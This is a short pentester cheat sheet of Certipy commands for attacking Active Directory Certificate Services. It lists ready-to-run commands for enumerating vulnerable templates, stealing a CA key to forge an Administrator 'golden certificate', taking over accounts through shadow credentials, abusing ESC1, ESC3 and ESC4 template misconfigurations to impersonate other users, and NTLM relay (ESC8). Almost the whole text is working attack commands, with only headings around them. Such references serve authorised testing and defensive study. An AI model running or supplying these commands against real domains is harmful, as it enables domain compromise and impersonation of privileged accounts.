### Source
https://github.com/ly4k/Certipy  

### Check for vulnerable templates (does only check port 80 in regard of ESC8)
```
certipy find -u <user>@<domain> -p <password> -dc-ip <dcIp> -ns <dnsIp> -dns-tcp
```

### Create golden certificate
```
certipy ca -backup -ca '<certificateAuthority>' -u <user>@<domain> -hashes <ntHash>
certipy forge -ca-pfx certificateAuthority.pfx -upn <user>@<domain> -subject 'CN=Administrator,CN=Users,DC=<domainComponent>,DC=<domainComponent>'
certipy auth -pfx <certificateAuthority>.pfx -dc-ip <dcIp>
```

### Take over account by writing to msDS-KeyCredentialLink
```
certipy shadow auto -u <user>@<domain> -p <password> -account <targetAccount>
```

### ESC1 supply an arbitrary Subject Alternative Name (SAN).
```
certipy req -u <user>@<domain> -p <password> -ca <certificateAuthority> -target <fqdnDcCa> -template <targetTemplate> -upn <targetAccount>@<domain>
certipy auth -pfx <targetAccount>.pfx -dc-ip <dcIp>
```

### ESC3 specify the Certificate Request Agent EKU
```
certipy req -u <user>@<domain> -p <password> -ca <certificateAuthority> -target <fqdnDcCa> -template <targetTemplate>
certipy req -u <user>@<domain> -p <password> -ca <certificateAuthority> -target <fqdnDcCa> -template User -on-behalf-of '<domain>\<targetAccount>' -pfx <targetAccount>.pfx
certipy auth -pfx <targetAccount>.pfx -dc-ip <dcIp>
```

### ESC4 write privileges over a certificate template configuration
```
certipy template -u <user>@<domain> -p <password> -template <targetTemplate> -save-old
certipy req -u <user>@<domain> -p <password> -ca <certificateAuthority> -target <fqdnDcCa> -template <targetTemplate> -upn <targetAccount>@<domain>
certipy template -u <user>@<domain> -p <password> -template <targetTemplate> -configuration <targetTemplate>.json
```

### ESC8 
```
certipy relay -ca <fqdnDcCa>
```

